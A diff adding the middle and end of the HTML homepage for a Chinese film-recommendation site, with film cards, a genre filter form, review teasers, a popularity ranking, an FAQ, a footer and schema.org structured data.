+          <div class="vinfo">
+            <p>一趟跨省列车上的六个陌生人，用一夜时间讲完各自未说完的话，结尾长镜头值得倒回去再看一遍。</p>
+            <div class="meta"><span class="sc">8.8</span><span class="pv">播放 38.1 万</span></div>
+          </div>
+        </article>
+
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#2E6E5A,#08180F 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>第七大陆</b><small>2026 · 科幻 / 冒险</small></div>
+            <span class="dur">131′</span>
+          </div>
+          <div class="vinfo">
+            <p>极地科考站失联后的七十二小时，视觉体系克制而压迫感十足，建议选大屏一次看完。</p>
+            <div class="meta"><span class="sc">8.6</span><span class="pv">播放 31.4 万</span></div>
+          </div>
+        </article>
+
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#6E5A2E,#181308 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>橘子汽水</b><small>2025 · 青春 / 文艺</small></div>
+            <span class="dur">104′</span>
+          </div>
+          <div class="vinfo">
+            <p>被多数榜单漏掉的小成本作品，讲一个小镇夏天与一场迟到的告别，看完后劲很足。</p>
+            <div class="meta"><span class="sc">8.4</span><span class="pv">播放 26.8 万</span></div>
+          </div>
+        </article>
+
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#3A4A8E,#0A0E1C 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>纸上星河</b><small>2026 · 动画 / 治愈</small></div>
+            <span class="dur">096′</span>
+          </div>
+          <div class="vinfo">
+            <p>手绘质感极佳，一封寄不出去的信被整座城市接力传递，孩子看冒险，大人看告别。</p>
+            <div class="meta"><span class="sc">8.3</span><span class="pv">播放 22.5 万</span></div>
+          </div>
+        </article>
+
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#4E5A6E,#0D1218 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>一年七城</b><small>2024 · 纪录 / 人文</small></div>
+            <span class="dur">112′</span>
+          </div>
+          <div class="vinfo">
+            <p>七位导演各拍一座城的一年，剪辑节奏舒服、信息密度高，适合分两天慢慢看完。</p>
+            <div class="meta"><span class="sc">8.2</span><span class="pv">播放 18.2 万</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：分类检索 -->
+  <section id="finder">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag ice">FILTER</span>
+          <h2>分类检索</h2>
+        </div>
+        <a class="more" href="#">进入完整索引</a>
+        <p>迅播电影网按类型、地区、年份与片长四档筛选，条件可叠加</p>
+      </div>
+
+      <div class="finder">
+        <div class="finder-grid">
+          <div class="finder-field">
+            <label for="f-type">类型</label>
+            <select id="f-type" name="type">
+              <option>全部类型</option>
+              <optgroup label="剧情向">
+                <option>动作片</option>
+                <option>悬疑片</option>
+                <option>爱情片</option>
+                <option>剧情片</option>
+              </optgroup>
+              <optgroup label="类型向">
+                <option>科幻片</option>
+                <option>喜剧片</option>
+                <option>动画片</option>
+                <option>纪录片</option>
+                <option>惊悚片</option>
+              </optgroup>
+            </select>
+          </div>
+          <div class="finder-field">
+            <label for="f-area">地区</label>
+            <select id="f-area" name="area">
+              <option>全部地区</option>
+              <optgroup label="华语">
+                <option>中国大陆</option>
+                <option>中国香港</option>
+                <option>中国台湾</option>
+              </optgroup>
+              <optgroup label="海外">
+                <option>欧美</option>
+                <option>日本</option>
+                <option>韩国</option>
+                <option>其他地区</option>
+              </optgroup>
+            </select>
+          </div>
+          <div class="finder-field">
+            <label for="f-year">年份</label>
+            <select id="f-year" name="year">
+              <option>全部年份</option>
+              <optgroup label="新片">
+                <option>2026</option>
+                <option>2025</option>
+                <option>2024</option>
+              </optgroup>
+              <optgroup label="经典">
+                <option>2010-2023</option>
+                <option>2000-2009</option>
+                <option>2000 以前</option>
+              </optgroup>
+            </select>
+          </div>
+          <div class="finder-field">
+            <label for="f-len">片长</label>
+            <select id="f-len" name="len">
+              <option>不限片长</option>
+              <optgroup label="短片">
+                <option>90 分钟以内</option>
+                <option>90-120 分钟</option>
+              </optgroup>
+              <optgroup label="长片">
+                <option>120-150 分钟</option>
+                <option>150 分钟以上</option>
+              </optgroup>
+            </select>
+          </div>
+        </div>
+
+        <div class="finder-actions">
+          <button type="button">开始筛选</button>
+          <button type="reset" class="ghost">重置条件</button>
+          <span class="tip">说明：迅播电影网的筛选结果按站内评分排序，不按商业权重排序。</span>
+        </div>
+
+        <div class="chips-row">
+          <a class="on" href="#">今日热播<b>8</b></a>
+          <a href="#">编辑推荐<b>128</b></a>
+          <a href="#">高分 8.5+<b>412</b></a>
+          <a href="#">适合周末<b>268</b></a>
+          <a href="#">合家欢<b>194</b></a>
+          <a href="#">深夜观看<b>322</b></a>
+          <a href="#">冷门佳作<b>740</b></a>
+          <a href="#">经典修复<b>560</b></a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：章节影评 -->
+  <section id="chapters">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag">CHAPTERS</span>
+          <h2>章节式影评与资讯</h2>
+        </div>
+        <a class="more" href="#">阅读全部影评</a>
+        <p>迅播电影网原创内容，按"章节时间轴"组织，关键剧情单独标注</p>
+      </div>
+
+      <div class="chapters">
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 01</span><span class="tm">00:00 — 00:12</span></div>
+          <h3>《长街尽头》：伏笔是如何在第三幕全部回收的</h3>
+          <p>逐段拆解它的线索铺设——第一段看似闲聊的对话，其实已经给出了关键时间差。全文无剧透，可放心阅读后再决定要不要买票。</p>
+          <p class="cue">好的悬疑片不靠吓你，靠让你回头重读一遍前面发生的事。</p>
+          <p class="sig"><span>迅播电影网 · 影评组</span><span>2026-09-30</span><span>阅读 1.4 万</span></p>
+        </article>
+
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 02</span><span class="tm">00:12 — 00:24</span></div>
+          <h3>2026 秋季档前瞻：六部值得标记的院线片</h3>
+          <p>今年秋季档悬疑与科幻占比明显上升，迅播电影网提前梳理必看清单，并附三条避雷提示，帮你把电影票花在刀刃上。</p>
+          <p class="cue">把电影票花在刀刃上，先从排除不值得的开始。</p>
+          <p class="sig"><span>迅播电影网 · 编辑部</span><span>2026-09-27</span><span>阅读 9200</span></p>
+        </article>
+
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 03</span><span class="tm">00:24 — 00:36</span></div>
+          <h3>数据观察：老片回看潮正在改变片库结构</h3>
+          <p>近三个月，上线十年以上的经典片播放量同比增长 38%，迅播电影网数据组解读这波回看潮背后的观影习惯变化。</p>
+          <p class="cue">回看不是怀旧，是把选择权从新片手里拿回来。</p>
+          <p class="sig"><span>迅播电影网 · 数据组</span><span>2026-09-22</span><span>阅读 6800</span></p>
+        </article>
+
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 04</span><span class="tm">00:36 — 00:48</span></div>
+          <h3>周末片单：五部适合放松的治愈系电影</h3>
+          <p>不想动脑的周末怎么过？迅播电影网挑了五部节奏舒缓、情绪温暖的片子，附一句话推荐理由与建议观看顺序。</p>
+          <p class="cue">治愈片的标准很简单：看完不想立刻刷手机。</p>
+          <p class="sig"><span>迅播电影网 · 片单组</span><span>2026-09-18</span><span>阅读 7500</span></p>
+        </article>
+
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 05</span><span class="tm">00:48 — 01:00</span></div>
+          <h3>播放指南：倍速、弹幕与音轨怎么选</h3>
+          <p>文艺片别开倍速，悬疑片建议关弹幕，外语片优先原声轨。迅播电影网按类型给出一份播放参数速查表。</p>
+          <p class="cue">播放器上的每个开关，都会改变一部片子的观感。</p>
+          <p class="sig"><span>迅播电影网 · 播放组</span><span>2026-09-15</span><span>阅读 5200</span></p>
+        </article>
+
+        <article class="chapter">
+          <div class="hd"><span class="ch">CH 06</span><span class="tm">01:00 — 01:12</span></div>
+          <h3>访谈：对话纪录片导演的一年七城</h3>
+          <p>专访《一年七城》主创，聊素材取舍、拍摄伦理，以及纪录片作者与被拍者之间那条微妙的边界。访谈经本人审阅后刊发。</p>
+          <p class="cue">剪辑台上没有真相，只有你愿意承担的解释。</p>
+          <p class="sig"><span>迅播电影网 · 采访组</span><span>2026-09-11</span><span>阅读 4300</span></p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：热度排行 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag">RANKING</span>
+          <h2>迅播电影网热度排行榜</h2>
+        </div>
+        <a class="more" href="#">查看完整榜单</a>
+        <p>综合站内评分、播放完成度与讨论热度，每两小时结算一次</p>
+      </div>
+
+      <div class="rankwrap">
+        <ol class="hotboard">
+          <li><span class="rk">01</span><span class="nm"><b>长街尽头</b><small>悬疑 / 犯罪 / 2026</small></span><span class="heat" aria-hidden="true"><i style="width:96%"></i></span><span class="pt">9.4</span></li>
+          <li><span class="rk">02</span><span class="nm"><b>归途列车</b><small>剧情 / 家庭 / 2026</small></span><span class="heat" aria-hidden="true"><i style="width:92%"></i></span><span class="pt">9.1</span></li>
+          <li><span class="rk">03</span><span class="nm"><b>第七大陆</b><small>科幻 / 冒险 / 2026</small></span><span class="heat" aria-hidden="true"><i style="width:89%"></i></span><span class="pt">8.9</span></li>
+          <li><span class="rk">04</span><span class="nm"><b>橘子汽水</b><small>青春 / 文艺 / 2025</small></span><span class="heat" aria-hidden="true"><i style="width:86%"></i></span><span class="pt">8.7</span></li>
+          <li><span class="rk">05</span><span class="nm"><b>纸上星河</b><small>动画 / 治愈 / 2026</small></span><span class="heat" aria-hidden="true"><i style="width:83%"></i></span><span class="pt">8.5</span></li>
+          <li><span class="rk">06</span><span class="nm"><b>一年七城</b><small>纪录 / 人文 / 2024</small></span><span class="heat" aria-hidden="true"><i style="width:79%"></i></span><span class="pt">8.3</span></li>
+          <li><span class="rk">07</span><span class="nm"><b>静默海域</b><small>剧情 / 悬疑 / 2025</small></span><span class="heat" aria-hidden="true"><i style="width:75%"></i></span><span class="pt">8.1</span></li>
+          <li><span class="rk">08</span><span class="nm"><b>深夜放映厅</b><small>合集 / 常驻片单</small></span><span class="heat" aria-hidden="true"><i style="width:70%"></i></span><span class="pt">7.9</span></li>
+        </ol>
+
+        <aside class="sideplay">
+          <h3>PLAYLIST　—　本周热播词</h3>
+          <ol>
+            <li><b>1</b><a href="#">长街尽头 结局解析</a></li>
+            <li><b>2</b><a href="#">今日热播片单</a></li>
+            <li><b>3</b><a href="#">2026 高分华语片</a></li>
+            <li><b>4</b><a href="#">悬疑片推荐</a></li>
+            <li><b>5</b><a href="#">迅播电影网排行榜</a></li>
+          </ol>
+          <p>热播词来自迅播电影网站内检索与播放统计，每周一随新一期片单更新。</p>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag ice">ABOUT</span>
+          <h2>关于迅播电影网</h2>
+        </div>
+        <a class="more" href="#">联系我们</a>
+        <p>为什么做成播放器的样子，以及我们坚持的四条规则</p>
+      </div>
+
+      <div class="about">
+        <div class="abpanel">
+          <h3>迅播电影网是什么</h3>
+          <p><span class="hl">迅播电影网</span>创办于 2023 年，是一个按"播放器"逻辑组织的中文电影站点。我们把每天值得看的片子排进一条播放队列，标注时长、评分与播放热度，按下播放键之前先帮你决定看什么。</p>
+          <p>名字里的"迅播"，说的是判断要快、推荐要准：<b>迅播电影网</b>不做资源搬运，只做筛选、排序与解释，所有内容免费阅读。</p>
+        </div>
+        <div class="abpanel">
+          <h3>编辑部四条规则</h3>
+          <ol class="rules">
+            <li><em>R1</em><span>看不完的片子不进队列，宁可空着也不凑数。</span></li>
+            <li><em>R2</em><span>影评不剧透，关键剧情单独标注，由读者选择是否展开。</span></li>
+            <li><em>R3</em><span>评分可追溯，公开打分人数与分数分布，拒绝水军干扰。</span></li>
+            <li><em>R4</em><span>队列位不出售，榜单只由数据与编辑判断决定。</span></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：常见问答 -->
+  <section id="faq">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag">FAQ</span>
+          <h2>常见问答</h2>
+        </div>
+        <p>关于迅播电影网的使用与内容说明 · 展开一条会自动收起其他条目</p>
+      </div>
+
+      <div class="faq">
+        <details name="xunbo-faq" open>
+          <summary>迅播电影网的评分是怎么算出来的？<span class="code">Q-01</span></summary>
+          <p>采用"观众打分 + 编辑评分"加权模型，观众分占七成、编辑分占三成，并剔除异常打分样本。每个影片条目都会展示参与打分的人数与分数分布区间，方便你判断样本是否足够。</p>
+        </details>
+        <details name="xunbo-faq">
+          <summary>播放热度是按什么排序的？<span class="code">Q-02</span></summary>
+          <p>热度榜单综合三项数据：站内评分、播放完成度（看到片尾的比例）与讨论热度。完成度权重高于单纯点击量，避免"点开就关"的影片被推上高位。</p>
+        </details>
+        <details name="xunbo-faq">
+          <summary>迅播电影网多久更新一次？<span class="code">Q-03</span></summary>
+          <p>每日 08:00 重排今日热播队列与热度榜；榜单每两小时结算一次；分类标签每周维护一次；章节影评与影视资讯不定期发布。</p>
+        </details>
+        <details name="xunbo-faq">
+          <summary>如何向我推荐的电影投稿？<span class="code">Q-04</span></summary>
+          <p>通过页面底部的"投稿与合作"入口留言，注明片名、年份与你的一句话推荐理由，迅播电影网编辑组会在三个工作日内回复。</p>
+        </details>
+        <details name="xunbo-faq">
+          <summary>手机上播放与筛选正常吗？<span class="code">Q-05</span></summary>
+          <p>正常。迅播电影网全站响应式：手机端播放窗口按 16:9 等比缩放、控制条参数自动换行，筛选表单转为单列下拉，影片卡与榜单转为单列布局，单手即可完成选片。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- 底部 -->
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-col">
+        <h4>迅播电影网</h4>
+        <p>迅播电影网是一个按播放器逻辑组织的中文电影站点，每日开播今日热播片单、分类检索、章节式影评、热度排行榜与观影指南，帮你按下播放键之前先选对那一部。</p>
+        <p class="f-url">https://xunbodianyingwang-cn.github.io</p>
+      </div>
+      <div class="f-col">
+        <h4>片单栏目</h4>
+        <ul>
+          <li><a href="#hot">今日热播片单</a></li>
+          <li><a href="#finder">分类检索</a></li>
+          <li><a href="#chapters">章节式影评</a></li>
+          <li><a href="#rank">热度排行榜</a></li>
+        </ul>
+      </div>
+      <div class="f-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">关于迅播电影网</a></li>
+          <li><a href="#faq">常见问答</a></li>
+          <li><a href="#">投稿与合作</a></li>
+          <li><a href="#">内容声明</a></li>
+        </ul>
+      </div>
+      <div class="f-col">
+        <h4>友情链接</h4>
+        <ul>
+          <li><a href="#">电影节日历</a></li>
+          <li><a href="#">独立电影观察</a></li>
+          <li><a href="#">影视资料库</a></li>
+          <li><a href="#">影迷社区</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="kw">
+      相关关键词：
+      <a href="#">迅播电影网</a><a href="#">电影推荐</a><a href="#">今日热播</a><a href="#">最新电影</a><a href="#">影视资讯</a><a href="#">高分电影</a><a href="#">电影排行榜</a><a href="#">影评</a><a href="#">观影指南</a><a href="#">电影分类</a>
+    </div>
+
+    <div class="f-bot">
+      <span>&copy; 2026 迅播电影网 XUNBO MOVIE PLAYER · 第 1286 期 · 保留所有权利</span>
+      <span><a href="#">隐私政策</a> · <a href="#">使用条款</a> · <a href="#home">回到播放页</a></span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://xunbodianyingwang-cn.github.io/#website",
+      "name": "迅播电影网",
+      "alternateName": "XUNBO MOVIE PLAYER",
+      "url": "https://xunbodianyingwang-cn.github.io/",
+      "description": "迅播电影网是专注电影推荐与影视资讯的中文影迷站点，每日开播今日热播片单、分类检索、章节式影评、高分电影排行榜与观影指南。",
+      "inLanguage": "zh-CN",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://xunbodianyingwang-cn.github.io/?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://xunbodianyingwang-cn.github.io/#organization",
+      "name": "迅播电影网",
+      "url": "https://xunbodianyingwang-cn.github.io/",
+      "description": "迅播电影网提供今日热播片单、分类检索、章节式影评与高分电影排行榜服务，每日更新。"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "迅播电影网首页", "item": "https://xunbodianyingwang-cn.github.io/"},
+        {"@type": "ListItem", "position": 2, "name": "今日热播片单", "item": "https://xunbodianyingwang-cn.github.io/#hot"},
+        {"@type": "ListItem", "position": 3, "name": "分类检索", "item": "https://xunbodianyingwang-cn.github.io/#finder"},
+        {"@type": "ListItem", "position": 4, "name": "章节式影评与资讯", "item": "https://xunbodianyingwang-cn.github.io/#chapters"},
+        {"@type": "ListItem", "position": 5, "name": "迅播电影网热度排行榜", "item": "https://xunbodianyingwang-cn.github.io/#rank"}
+      ]
+    }
+  ]
+}
+</script>
+
+</body>
+</html>
